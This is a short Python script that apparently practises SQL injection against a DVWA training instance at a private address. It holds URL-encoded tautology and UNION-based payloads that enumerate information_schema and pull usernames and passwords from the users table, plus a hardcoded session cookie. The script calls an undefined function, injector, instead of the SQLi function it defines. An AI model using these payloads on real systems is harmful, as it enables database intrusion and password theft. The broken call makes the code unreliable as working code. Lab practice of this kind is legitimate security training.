import requests
import json
import urllib
from urllib.parse import urlencode, quote_plus


def SQLi(id, level, sessid):
	url = "http://192.168.10.2/vulnerabilities/sqli_blind/" + id
	header = {'Cookie':"PHPSESSID=%s; security=%s" % (sessid, level)}
	r = requests.get(url, headers=header)
	print(r.content)

def main():
	payload = {'id': "-1' or '1'='1"}
	print(urlencode(payload, quote_via=quote_plus))
	print(urllib.parse.unquote("-1%27+or+1%3D1+union+select+table_schema%2C+table_name+from+information_schema.tables+%23&Submit=Submit#"))
	check = "?id='&Submit=Submit#"
	idLow1 = "?id=-1' or '1'='1&Submit=Submit#"
	idLow2 = "?id=-1%27+or+1%3D1+union+select+table_schema%2C+table_name+from+information_schema.tables+%23&Submit=Submit#"
	idLow3 = "?id=-1%27+or+1%3D1+union+select+table_name%2C+column_name+from+information_schema.columns%23+&Submit=Submit#"
	idLow4 = "?id=-1%27+or+1%3D1+union+select+first_name%2C+password+from+users+%23&Submit=Submit#"
	idMedium1 = "?id=-1+or+1%3D1+union+select+first_name%2Cpassword+from+users&Submit=Submit#"
	blindLow1 = "?id=%27&Submit=Submit#"
	blindLow2 = "?id=1%27+or+1%3D1%23&Submit=Submit#"
	blindLow3 = "?id=-1%27+or+1%3D1+union+select+first_name%2C+password+from+users+%23&Submit=Submit#"
	blindMedium1 = "?id=-1+or+1%3D1+union+select+first_name%2C+password+from+users+&Submit=Submit#"
	securityLevel = 'medium'
	SESSION = '9to6so5dpb8u94mqm0h6ukvnl2'
	injector(blindMedium1,securityLevel,SESSION)
if __name__ == '__main__':
	main()